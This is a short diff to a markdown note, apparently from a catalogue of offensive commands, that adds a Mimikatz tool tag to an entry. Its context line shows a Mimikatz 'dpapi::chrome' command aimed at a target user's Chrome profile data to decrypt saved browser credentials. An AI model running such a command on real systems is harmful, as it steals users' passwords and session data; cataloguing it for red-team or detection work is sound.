@@ -8,6 +8,8 @@ data: mimikatz.exe "dpapi::chrome /in:"""C:\Users\$_TARGET_USER\AppData\Local\Go
 output: ''
 created_at: '2023-03-13T19:52:35.078857+00:00'
 updated_at: '2023-03-14T01:11:04.243252+00:00'
+tools:
+- '[[Mimikatz]]'
 ---
 
 # Command ae14bc4f
